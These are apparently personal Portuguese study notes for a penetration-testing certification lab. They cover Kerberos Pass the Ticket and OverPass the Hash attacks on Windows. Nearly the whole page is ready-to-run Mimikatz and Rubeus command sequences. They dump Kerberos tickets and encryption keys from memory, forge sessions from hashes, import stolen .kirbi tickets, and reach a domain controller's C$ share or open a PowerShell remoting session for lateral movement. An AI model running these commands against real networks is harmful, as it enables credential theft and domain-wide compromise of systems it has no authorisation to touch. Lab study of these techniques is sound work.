> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/pass-the-ticket-ptt-from-windows.md).

# Pass the Ticket (PtT) from Windows

**Mimikatz - Export tickets**

* Podemos coletar todos os tickets de um sistema usando o `Mimikatz` com o módulo `sekurlsa::tickets /export`

{% code lineNumbers="true" %}

```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exii
dir *.kirbi
```

{% endcode %}

* Rubeus - Export tickets

```
Rubeus.exe dump /nowrap
```

**OverPass the Hash**

* podemos usar o Mimikatz para extrair todas as chaves de criptografia Kerberos dos usuários usando o módulo `sekurlsa::ekeys`&#x20;

{% code lineNumbers="true" %}

```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

{% endcode %}

* Com as chaves `AES256_HMAC`e `RC4_HMAC`, podemos realizar o ataque OverPass the Hash

{% code lineNumbers="true" %}

```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:<key-rc4>
```

{% endcode %}

* Isso criará uma nova `cmd.exe`janela que poderemos usar para solicitar acesso a qualquer serviço que desejarmos no contexto do usuário alvo.

* **Rubeus - Pass the Key aka. OverPass the Hash**

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<hash> /nowrap
```

{% hint style="info" %}
Mimikatz requer direitos administrativos para executar os ataques Pass the Key/OverPass the Hash, enquanto o Rubeus não.
{% endhint %}

**Pass the Ticket (PtT)**

* Se tivermos alguns tickets Kerberos, podemos usá-los para nos mover lateralmente dentro de um ambiente.
* **Rubeus - Pass the Ticket**

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<hash> /ptt
```

* Outra forma é importar o ticket para a sessão atual usando o `.kirbi`arquivo do disco.

```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

* Por fim, também podemos realizar o ataque Pass the Ticket usando o módulo Mimikatz `kerberos::ptt`e o arquivo .kirbi que contém o ticket que queremos importar.

{% code lineNumbers="true" %}

```
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
dir \\DC01.inlanefreight.htb\c$
```

{% endcode %}

* **Mimikatz - Pass the Ticket for lateral movement**

{% code lineNumbers="true" %}

```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
```

{% endcode %}

**Rubeus - PowerShell Remoting with Pass the Ticket**

* Crie um processo sacrificial com Rubeus

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

* O comando acima abrirá uma nova janela do cmd. A partir dessa janela, podemos executar o Rubeus para solicitar um novo TGT com a opção `/ptt`de importar o ticket para nossa sessão atual e conectar ao DC usando o PowerShell Remoting.

**Rubeus - Passe o bilhete para movimento lateral**

{% code lineNumbers="true" %}

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<hash> /ptt
powershell
Enter-PSSession -ComputerName DC01
```

{% endcode %}
